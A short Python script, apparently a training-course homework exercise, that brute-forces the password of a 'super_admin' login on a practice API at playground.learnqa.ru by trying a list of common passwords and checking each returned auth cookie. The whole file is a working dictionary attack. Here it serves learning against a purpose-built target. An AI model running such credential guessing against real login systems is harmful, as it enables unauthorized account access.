import requests

url_get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"
passwords = [
    "123456", "123456789", "qwerty", "password", "1234567",
    "12345678", "12345", "iloveyou", "111111", "123123",
    "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
    "654321", "555555", "lovely", "7777777", "welcome",
    "888888", "princess", "dragon", "password1", "123qwe"
]


for password in passwords:
    response = requests.post(url_get_secret_password_homework, data={"login": login, "password": password})
    auth_cookie = response.cookies.get("auth_cookie")
    cookies = {"auth_cookie": auth_cookie}

    auth_response = requests.get(url_check_auth_cookie, cookies=cookies)

    if auth_response.text == "You are authorized":
        print(f"\rCorrect password: {password}")
        print(f"Response: {auth_response.text}")
        break
    else:
        print(f"\rTrying password: {password}          ", end="", flush=True)
